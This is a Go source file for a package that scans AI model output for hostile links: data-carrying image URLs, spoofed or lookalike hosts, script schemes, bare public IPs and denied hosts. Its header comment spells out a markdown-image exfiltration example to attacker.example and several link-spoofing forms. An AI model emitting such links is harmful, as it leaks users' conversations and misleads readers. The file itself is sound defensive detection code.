// Package linkscan judges the links in a piece of model output by their form
// and by lists the operator supplies. It reads text and nothing else: it
// resolves no name, opens no connection and fetches nothing, and it imports
// no package that could (imports_test.go holds it to that).
//
// What it looks for is a link that does something the reader of the answer
// did not ask for:
//
//   - one that carries data out in its address. A markdown image is fetched
//     by the client the moment the answer is shown, so
//     ![](https://attacker.example/?q=<the conversation>) sends the
//     conversation to that host with no click at all;
//   - one that is not what it reads as: a host hidden behind user
//     information (https://bank.example@evil.example), a host written with
//     letters of another script that look like Latin ones, a link whose text
//     names one host while it goes to another;
//   - one that runs code or opens a local file when followed (javascript:,
//     data:, file:, vbscript:);
//   - one to a bare public address or an unusual port;
//   - one to a host the operator has denied.
//
// Text inside a code block or a code span is not rendered as a link, so only
// the deny list applies there.
package linkscan

import (
	"sort"
	"strings"
	"unicode"
	"unicode/utf8"
)

// Categories of a hit.
const (
	DeniedHost   = "link_denied_host"
	Exfiltration = "link_exfiltration"
	Userinfo     = "link_userinfo"
	Homoglyph    = "link_homoglyph"
	Scheme       = "link_scheme"
	TextMismatch = "link_text_mismatch"
	IPHost       = "link_ip_host"
	Port         = "link_port"
)

// Kinds of link: how it is written in the text.
const (
	KindImage = "markdown_image"
	KindLink  = "markdown_link"
	KindHTML  = "html_attribute"
	KindBare  = "bare_url"
)

// Limits of the form checks. They were set against the benign corpus in
// corpus_test.go; the reasoning is next to each check.
const (
	// An image is fetched without a click, so little is allowed in its
	// address: a value of imageValueBytes or more, a sentence, or
	// imageQueryBytes of query in all.
	imageValueBytes = 64
	imageQueryBytes = 160
	imagePathBytes  = 96
	imageWords      = 5
	imageWordsBytes = 32
	// A link has to be followed by the reader, and long addresses are
	// ordinary there: a search, a signed download, a dashboard's state.
	linkValueBytes = 256
	linkQueryBytes = 1024
	linkPathBytes  = 256
	linkWords      = 25

	// maxLinkText is how far back the text of a markdown link is looked for.
	maxLinkText = 512
	// maxHostBytes is the longest host a DNS name can be.
	maxHostBytes = 253
)

// Hit is one thing found about one link.
type Hit struct {
	Category string
	// Start and End delimit the link's address in the text.
	Start, End int
	// Host is the host the link goes to, lower-cased; empty for a link
	// without one (javascript:, data:).
	Host string
	Kind string
	// Payload is the size in bytes of what the address carries, for an
	// exfiltration hit.
	Payload int
}

// Scan returns what is found about the links in text, ordered by position.
// lists may be nil.
func Scan(text string, lists *Lists) []Hit {
	// Every link this package judges has a scheme, and a scheme ends in a
	// colon (or in the character reference of one, in a markdown link).
	if strings.IndexByte(text, ':') < 0 && !strings.Contains(text, "](") {
		return nil
	}
	s := &scan{text: text, lists: lists, code: codeRegions(text)}
	s.markdown()
	s.html()
	s.bare()
	sort.SliceStable(s.hits, func(i, j int) bool { return s.hits[i].Start < s.hits[j].Start })
	return s.hits
}

type scan struct {
	text  string
	lists *Lists
	code  []span
	// taken are the addresses already judged as part of a markdown link or
	// an HTML attribute, so that the bare scan does not judge them again.
	taken []span
	hits  []Hit
}

type span struct{ from, to int }

func within(spans []span, pos int) bool {
	i := sort.Search(len(spans), func(i int) bool { return spans[i].to > pos })
	return i < len(spans) && spans[i].from <= pos
}

// codeRegions returns the fenced code blocks and code spans of text, in
// order. A fence that is not closed runs to the end of the text.
func codeRegions(text string) []span {
	if strings.IndexByte(text, '`') < 0 && !strings.Contains(text, "~~~") {
		return nil
	}
	var out []span
	pos := 0
	fence, fenceStart := "", 0
	for pos < len(text) {
		end := strings.IndexByte(text[pos:], '\n')
		lineEnd := len(text)
		if end >= 0 {
			lineEnd = pos + end
		}
		line := strings.TrimLeft(text[pos:lineEnd], " \t")
		marker := ""
		switch {
		case strings.HasPrefix(line, "```"):
			marker = "```"
		case strings.HasPrefix(line, "~~~"):
			marker = "~~~"
		}
		switch {
		case fence == "" && marker != "":
			fence, fenceStart = marker, pos
		case fence != "" && marker == fence:
			out = append(out, span{fenceStart, lineEnd})
			fence = ""
		case fence == "":
			out = appendCodeSpans(out, text, pos, lineEnd)
		}
		if end < 0 {
			break
		}
		pos = lineEnd + 1
	}
	if fence != "" {
		out = append(out, span{fenceStart, len(text)})
	}
	return out
}

// appendCodeSpans adds the `code spans` of one line.
func appendCodeSpans(out []span, text string, from, to int) []span {
	for i := from; i < to; {
		if text[i] != '`' {
			i++
			continue
		}
		run := i
		for i < to && text[i] == '`' {
			i++
		}
		ticks := text[run:i]
		closing := strings.Index(text[i:to], ticks)
		if closing < 0 {
			return out
		}
		out = append(out, span{run, i + closing + len(ticks)})
		i += closing + len(ticks)
	}
	return out
}

// markdown judges every [text](address) and ![text](address).
func (s *scan) markdown() {
	text := s.text
	for at := 0; ; {
		j := strings.Index(text[at:], "](")
		if j < 0 {
			return
		}
		j += at
		at = j + 2
		from, to := markdownDestination(text, j+2)
		if to <= from {
			continue
		}
		kind := KindLink
		label := ""
		if open := matchingBracket(text, j); open >= 0 {
			label = text[open+1 : j]
			if open > 0 && text[open-1] == '!' {
				kind = KindImage
			}
		}
		s.taken = append(s.taken, span{from, to})
		s.judge(from, to, kind, label)
		at = to
	}
}

// markdownDestination returns the span of a link's address, given the
// position just after "](". The address ends at white space, at the
// parenthesis that closes the link, or with the text.
func markdownDestination(text string, pos int) (from, to int) {
	for pos < len(text) && (text[pos] == ' ' || text[pos] == '\t') {
		pos++
	}
	if pos < len(text) && text[pos] == '<' {
		end := strings.IndexAny(text[pos:], ">\n")
		if end < 0 {
			return pos + 1, len(text)
		}
		return pos + 1, pos + end
	}
	depth := 0
	for i := pos; i < len(text); i++ {
		switch c := text[i]; {
		case c == '\\' && i+1 < len(text):
			i++
		case c == '(':
			depth++
		case c == ')':
			if depth == 0 {
				return pos, i
			}
			depth--
		case c == ' ' || c == '\t' || c == '\n' || c == '\r':
			return pos, i
		}
	}
	return pos, len(text)
}

// matchingBracket returns the position of the "[" that the "]" at close
// closes, or -1.
func matchingBracket(text string, close int) int {
	depth := 0
	for i := close - 1; i >= 0 && close-i <= maxLinkText; i-- {
		switch text[i] {
		case ']':
			depth++
		case '[':
			if depth == 0 {
				return i
			}
			depth--
		}
	}
	return -1
}

// html judges the address in every src="…" and href="…".
func (s *scan) html() {
	text := s.text
	if strings.IndexByte(text, '<') < 0 {
		return
	}
	// The addresses found here; s.taken stays sorted while it is searched.
	var found []span
	for _, attr := range []string{"src", "href"} {
		for at := 0; at < len(text); {
			j := indexFold(text[at:], attr)
			if j < 0 {
				break
			}
			j += at
			at = j + len(attr)
			if j > 0 && isNameByte(text[j-1]) {
				continue
			}
			k := at
			for k < len(text) && (text[k] == ' ' || text[k] == '\t') {
				k++
			}
			if k >= len(text) || text[k] != '=' {
				continue
			}
			k++
			for k < len(text) && (text[k] == ' ' || text[k] == '\t') {
				k++
			}
			if k >= len(text) || (text[k] != '"' && text[k] != '\'') {
				continue
			}
			quote := text[k]
			from := k + 1
			end := strings.IndexByte(text[from:], quote)
			to := len(text)
			if end >= 0 {
				to = from + end
			}
			if nl := strings.IndexByte(text[from:to], '\n'); nl >= 0 {
				to = from + nl
			}
			if within(s.taken, from) {
				continue
			}
			kind := KindHTML
			if attr == "src" {
				// Fetched when the answer is shown, as a markdown image is.
				kind = KindImage
			}
			found = append(found, span{from, to})
			s.judge(from, to, kind, "")
			at = to
		}
	}
	if len(found) > 0 {
		s.taken = append(s.taken, found...)
		sort.Slice(s.taken, func(i, j int) bool { return s.taken[i].from < s.taken[j].from })
	}
}

func isNameByte(c byte) bool {
	return c == '-' || c == '_' || (c >= '0' && c <= '9') || (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z')
}

// indexFold is strings.Index for a lower-case ASCII needle, ignoring the
// case of the text.
func indexFold(text, needle string) int {
	for i := 0; i+len(needle) <= len(text); i++ {
		ok := true
		for j := 0; j < len(needle); j++ {
			c := text[i+j]
			if c >= 'A' && c <= 'Z' {
				c += 'a' - 'A'
			}
			if c != needle[j] {
				ok = false
				break
			}
		}
		if ok {
			return i
		}
	}
	return -1
}

// bareSchemes are the schemes a URL written out in the text is read with.
var bareSchemes = map[string]bool{"http": true, "https": true, "ftp": true, "ws": true, "wss": true}

// bare judges the URLs written out in the text.
func (s *scan) bare() {
	text := s.text
	for at := 0; ; {
		j := strings.Index(text[at:], "://")
		if j < 0 {
			return
		}
		j += at
		at = j + 3
		from := j
		for from > 0 && isSchemeByte(text[from-1]) {
			from--
		}
		for from < j && !isLetter(text[from]) {
			from++
		}
		if !bareSchemes[strings.ToLower(text[from:j])] {
			continue
		}
		if within(s.taken, from) {
			continue
		}
		to := bareEnd(text, j+3)
		s.judge(from, to, KindBare, "")
		at = to
	}
}

func isLetter(c byte) bool { return (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') }

func isSchemeByte(c byte) bool {
	return isLetter(c) || (c >= '0' && c <= '9') || c == '+' || c == '-' || c == '.'
}

// bareEnd returns where a URL written out in the text ends: at white space,
// a quote or an angle bracket, without the punctuation of the sentence it
// stands in and without a parenthesis it did not open.
func bareEnd(text string, pos int) int {
	end := pos
	depth := 0
scan:
	for end < len(text) {
		switch c := text[end]; c {
		case ' ', '\t', '\n', '\r', '<', '>', '"', '`', '|':
			break scan
		case '(':
			depth++
		case ')':
			if depth == 0 {
				break scan
			}
			depth--
		}
		end++
	}
	for end > pos {
		switch text[end-1] {
		case '.', ',', ';', ':', '!', '?', '\'', '*', '_', ']', '}':
			end--
			continue
		}
		break
	}
	return end
}

// judge runs the checks on the address text[from:to].
func (s *scan) judge(from, to int, kind, label string) {
	raw := s.text[from:to]
	if raw == "" {
		return
	}
	u, ok := parseURL(raw)
	if !ok {
		return
	}
	inCode := within(s.code, from)
	hit := func(category string, payload int) {
		s.hits = append(s.hits, Hit{Category: category, Start: from, End: to, Host: u.host, Kind: kind, Payload: payload})
	}

	if u.host == "" {
		// No host: a scheme that does something by itself.
		if inCode || (kind != KindLink && kind != KindImage) {
			return
		}
		switch u.scheme {
		case "javascript", "vbscript", "file":
			hit(Scheme, 0)
		case "data":
			// A picture given inline is a picture, shown or linked to.
			// Anything else under data: is a document the link opens.
			if inlinePicture(u.rest) {
				return
			}
			hit(Scheme, 0)
		}
		return
	}

	if s.lists.denied(u.host) {
		hit(DeniedHost, 0)
	}
	if inCode || s.lists.allowed(u.host) {
		return
	}
	if u.scheme == "file" && (kind == KindLink || kind == KindImage) {
		hit(Scheme, 0)
		return
	}

	if hostLike(u.user) {
		hit(Userinfo, 0)
	}
	if lookalikeHost(u.host) {
		hit(Homoglyph, 0)
	}
	if n := payload(u, kind == KindImage); n > 0 {
		hit(Exfiltration, n)
	}
	// A bare address and an unusual port are ordinary where a URL is
	// written out to be read: a service on the reader's own network, an
	// example. They are judged where the address is behind a link's text.
	if kind != KindBare {
		ip, public := ipHost(u.host)
		switch {
		case ip && public:
			hit(IPHost, 0)
		case !ip && u.port != "" && !usualPort(u.port) && publicName(u.host):
			hit(Port, 0)
		}
	}
	if kind == KindLink && label != "" {
		if shown, ok := hostShown(label); ok && !sameSite(shown, u.host) {
			hit(TextMismatch, 0)
		}
	}
}

// inlinePicture reports whether what follows "data:" is a raster picture.
func inlinePicture(rest string) bool {
	rest = strings.ToLower(rest)
	for _, t := range []string{"image/png", "image/jpeg", "image/gif", "image/webp"} {
		if strings.HasPrefix(rest, t) {
			return true
		}
	}
	return false
}

func usualPort(port string) bool {
	switch strings.TrimLeft(port, "0") {
	case "80", "443", "8080", "8443":
		return true
	}
	return false
}

// publicName reports whether a host name is one of the public DNS: it has a
// dot and does not end in a name reserved for private use.
func publicName(host string) bool {
	dot := strings.LastIndexByte(host, '.')
	if dot < 0 {
		return false
	}
	switch host[dot+1:] {
	case "local", "localhost", "internal", "lan", "home", "corp", "test", "arpa", "intranet":
		return false
	}
	return true
}

// url is an address taken apart the way a browser reads it.
type url struct {
	scheme string
	// rest is what follows "scheme:" for an address without a host.
	rest             string
	user             string
	host, port       string
	path, query      string
	hasAuthoritySign bool
}

// parseURL reads an address. ok is false for one without a scheme, which is
// a relative link.
func parseURL(raw string) (url, bool) {
	raw = cleanAddress(raw)
	colon := strings.IndexByte(raw, ':')
	if colon <= 0 {
		return url{}, false
	}
	for i := 0; i < colon; i++ {
		if !isSchemeByte(raw[i]) || (i == 0 && !isLetter(raw[i])) {
			return url{}, false
		}
	}
	u := url{scheme: strings.ToLower(raw[:colon])}
	rest := raw[colon+1:]
	switch u.scheme {
	case "http", "https", "ftp", "ws", "wss", "file":
	default:
		u.rest = rest
		return u, true
	}
	// A browser reads "\" as "/" here, and takes the host after any number
	// of slashes.
	i := 0
	for i < len(rest) && (rest[i] == '/' || rest[i] == '\\') {
		i++
	}
	u.hasAuthoritySign = i >= 2
	rest = rest[i:]
	end := len(rest)
	for k := 0; k < len(rest); k++ {
		if c := rest[k]; c == '/' || c == '\\' || c == '?' || c == '#' {
			end = k
			break
		}
	}
	authority, tail := rest[:end], rest[end:]
	if at := strings.LastIndexByte(authority, '@'); at >= 0 {
		u.user = authority[:at]
		if c := strings.IndexByte(u.user, ':'); c >= 0 {
			u.user = u.user[:c]
		}
		authority = authority[at+1:]
	}
	host := authority
	if strings.HasPrefix(host, "[") {
		if close := strings.IndexByte(host, ']'); close >= 0 {
			u.port = strings.TrimPrefix(host[close+1:], ":")
			host = host[:close+1]
		}
	} else if c := strings.LastIndexByte(host, ':'); c >= 0 {
		u.port = host[c+1:]
		host = host[:c]
	}
	for _, c := range []byte(u.port) {
		if c < '0' || c > '9' {
			u.port = ""
			break
		}
	}
	host = strings.TrimSuffix(strings.ToLower(percentDecode(host)), ".")
	if len(host) > maxHostBytes {
		host = host[:maxHostBytes]
		for len(host) > 0 && !utf8.ValidString(host) {
			host = host[:len(host)-1]
		}
	}
	u.host = host
	if hash := strings.IndexByte(tail, '#'); hash >= 0 {
		// The part after "#" stays with the client; it is not sent.
		tail = tail[:hash]
	}
	if q := strings.IndexByte(tail, '?'); q >= 0 {
		u.path, u.query = tail[:q], tail[q+1:]
	} else {
		u.path = tail
	}
	if u.host == "" && u.scheme != "file" {
		return url{}, false
	}
	return u, true
}

// cleanAddress removes what a browser and a markdown renderer remove before
// they read an address: white space and control characters at its start,
// tabs and line breaks anywhere, and the character references of a colon.
func cleanAddress(raw string) string {
	raw = strings.TrimLeftFunc(raw, func(r rune) bool { return r <= ' ' })
	if strings.ContainsAny(raw, "\t\r\n") {
		raw = strings.NewReplacer("\t", "", "\r", "", "\n", "").Replace(raw)
	}
	if amp := strings.IndexByte(raw, '&'); amp >= 0 && amp < 16 {
		lower := strings.ToLower(raw[:min(len(raw), 32)])
		for _, ref := range []string{"&colon;", "&#58;", "&#x3a;", "&#058;", "&#x003a;"} {
			if k := strings.Index(lower, ref); k >= 0 {
				raw = raw[:k] + ":" + raw[k+len(ref):]
				break
			}
		}
	}
	return raw
}

func unhex(c byte) (byte, bool) {
	switch {
	case c >= '0' && c <= '9':
		return c - '0', true
	case c >= 'a' && c <= 'f':
		return c - 'a' + 10, true
	case c >= 'A' && c <= 'F':
		return c - 'A' + 10, true
	}
	return 0, false
}

// percentDecode decodes %XX. What is not an escape stays as it is.
func percentDecode(s string) string {
	if strings.IndexByte(s, '%') < 0 {
		return s
	}
	var b strings.Builder
	for i := 0; i < len(s); i++ {
		if s[i] == '%' && i+2 < len(s) {
			hi, ok1 := unhex(s[i+1])
			lo, ok2 := unhex(s[i+2])
			if ok1 && ok2 {
				b.WriteByte(hi<<4 | lo)
				i += 2
				continue
			}
		}
		b.WriteByte(s[i])
	}
	return b.String()
}

// hostLike reports whether the user information of an address reads as a
// host name: "bank.example" in https://bank.example@evil.example. A plain
// user name does not.
func hostLike(user string) bool {
	user = percentDecode(user)
	dot := strings.LastIndexByte(user, '.')
	if dot <= 0 || dot == len(user)-1 {
		return false
	}
	tld := user[dot+1:]
	if len(tld) < 2 || len(tld) > 24 {
		return false
	}
	for i := 0; i < len(tld); i++ {
		if !isLetter(tld[i]) {
			return false
		}
	}
	return true
}

// signedKeys are the query parameters of a signed download: an S3 or GCS
// presigned URL, an Azure SAS, a CloudFront signed URL. Their values are
// long and random by design.
var signedKeys = map[string]bool{
	"x-amz-algorithm": true, "x-amz-credential": true, "x-amz-date": true, "x-amz-expires": true,
	"x-amz-signedheaders": true, "x-amz-signature": true, "x-amz-security-token": true,
	"x-goog-algorithm": true, "x-goog-credential": true, "x-goog-date": true, "x-goog-expires": true,
	"x-goog-signedheaders": true, "x-goog-signature": true,
	"awsaccesskeyid": true, "signature": true, "expires": true, "key-pair-id": true, "policy": true,
	"sig": true, "sv": true, "se": true, "sp": true, "sr": true, "st": true, "spr": true, "skoid": true,
	"sktid": true, "skt": true, "ske": true, "sks": true, "skv": true,
	"response-content-disposition": true, "response-content-type": true,
}

// payload returns how many bytes of data the address carries beyond what an
// ordinary link of its kind does, or 0. An image is held to less than a
// link (see the limits).
func payload(u url, image bool) int {
	valueMax, queryMax, pathMax, words := linkValueBytes, linkQueryBytes, linkPathBytes, linkWords
	wordsBytes := 0
	if image {
		valueMax, queryMax, pathMax, words, wordsBytes = imageValueBytes, imageQueryBytes, imagePathBytes, imageWords, imageWordsBytes
	}

	// The parameters of a signed download are left out when the address has
	// the look of one: two of them or more.
	type param struct{ key, value string }
	var params []param
	signed := 0
	if u.query != "" {
		for _, part := range strings.FieldsFunc(u.query, func(r rune) bool { return r == '&' || r == ';' }) {
			key, value, _ := strings.Cut(part, "=")
			if signedKeys[strings.ToLower(key)] {
				signed++
			}
			params = append(params, param{key, value})
		}
	}
	total, worst := 0, 0
	for _, p := range params {
		if signed >= 2 && signedKeys[strings.ToLower(p.key)] {
			continue
		}
		total += len(p.key) + len(p.value) + 1
		n := len(p.value)
		if p.value == "" {
			n = len(p.key) // "?<data>" with no "="
		}
		if n >= valueMax && n > worst {
			worst = n
		}
		if w := wordCount(p.value); w >= words && len(p.value) >= wordsBytes && len(p.value) > worst {
			worst = len(p.value)
		}
	}
	if total >= queryMax && total > worst {
		worst = total
	}
	for _, seg := range strings.Split(u.path, "/") {
		if len(seg) >= pathMax && len(seg) > worst {
			worst = len(seg)
		}
	}
	return worst
}

// wordCount counts the words of a query value: the pieces between encoded
// spaces.
func wordCount(value string) int {
	if len(value) < 8 {
		return 0
	}
	n, in := 0, false
	for i := 0; i < len(value); i++ {
		sep := value[i] == '+' || value[i] == ' '
		if value[i] == '%' && i+2 < len(value) && value[i+1] == '2' && value[i+2] == '0' {
			sep = true
			i += 2
		}
		switch {
		case sep:
			in = false
		case !in:
			in = true
			n++
		}
	}
	return n
}

// ipHost reports whether host is an IP address in any of the forms a
// browser accepts, and whether it is a public one. An address written in a
// form other than four decimal numbers (one number, hexadecimal, octal,
// fewer parts) counts as public: nobody writes a link to their own network
// that way.
func ipHost(host string) (ip, public bool) {
	if strings.HasPrefix(host, "[") {
		return true, publicIPv6(strings.Trim(host, "[]"))
	}
	parts := strings.Split(host, ".")
	if len(parts) > 4 {
		return false, false
	}
	var nums [4]uint64
	plain := len(parts) == 4
	for i, p := range parts {
		n, decimal, ok := ipPart(p)
		if !ok {
			return false, false
		}
		nums[i] = n
		if !decimal || n > 255 {
			plain = false
		}
	}
	if !plain {
		return true, true
	}
	a, b := nums[0], nums[1]
	switch {
	case a == 10, a == 127, a == 0:
	case a == 172 && b >= 16 && b <= 31:
	case a == 192 && b == 168:
	case a == 169 && b == 254:
	case a == 100 && b >= 64 && b <= 127:
	default:
		return true, true
	}
	return true, false
}

// ipPart reads one part of a dotted address: decimal, 0x hexadecimal, or
// octal with a leading zero.
func ipPart(p string) (n uint64, decimal, ok bool) {
	if p == "" || len(p) > 12 {
		return 0, false, false
	}
	base := uint64(10)
	digits := p
	switch {
	case len(p) > 2 && (p[:2] == "0x" || p[:2] == "0X"):
		base, digits = 16, p[2:]
	case len(p) > 1 && p[0] == '0':
		base, digits = 8, p[1:]
	}
	for i := 0; i < len(digits); i++ {
		d, isHex := unhex(digits[i])
		if !isHex || uint64(d) >= base {
			return 0, false, false
		}
		n = n*base + uint64(d)
	}
	return n, base == 10, true
}

func publicIPv6(addr string) bool {
	addr = strings.ToLower(addr)
	if zone := strings.IndexByte(addr, '%'); zone >= 0 {
		addr = addr[:zone]
	}
	switch {
	case addr == "::1", addr == "::":
		return false
	case strings.HasPrefix(addr, "fc"), strings.HasPrefix(addr, "fd"):
		return false
	case strings.HasPrefix(addr, "fe8"), strings.HasPrefix(addr, "fe9"), strings.HasPrefix(addr, "fea"), strings.HasPrefix(addr, "feb"):
		return false
	}
	return true
}

// hostTLDs are the endings that make the text of a link read as a host
// name. The list is short on purpose: "README.md", "main.rs" and "app.py"
// are file names, and their endings are top-level domains too.
var hostTLDs = map[string]bool{
	"com": true, "net": true, "org": true, "gov": true, "edu": true, "bank": true,
	"tr": true, "uk": true, "de": true, "fr": true, "eu": true,
}

// hostShown returns the host a link's text shows, when the text is an
// address or a host name and nothing else.
func hostShown(label string) (string, bool) {
	label = strings.TrimSpace(strings.Trim(strings.TrimSpace(label), "*_`"))
	if label == "" || strings.ContainsAny(label, " \t\n") {
		return "", false
	}
	if u, ok := parseURL(label); ok && u.host != "" && u.hasAuthoritySign {
		return u.host, true
	}
	host := strings.ToLower(label)
	if cut := strings.IndexAny(host, "/?#"); cut >= 0 {
		host = host[:cut]
	}
	host = strings.TrimSuffix(host, ".")
	dot := strings.LastIndexByte(host, '.')
	if dot <= 0 || strings.ContainsAny(host, "@:()[]") {
		return "", false
	}
	if !strings.HasPrefix(host, "www.") && !hostTLDs[host[dot+1:]] {
		return "", false
	}
	for _, r := range host {
		if !(r == '.' || r == '-' || unicode.IsLetter(r) || unicode.IsDigit(r)) {
			return "", false
		}
	}
	return host, true
}

// sameSite reports whether two hosts are the same or one is under the
// other, a leading "www." aside.
func sameSite(a, b string) bool {
	a, b = strings.TrimPrefix(a, "www."), strings.TrimPrefix(b, "www.")
	return a == b || strings.HasSuffix(a, "."+b) || strings.HasSuffix(b, "."+a)
}
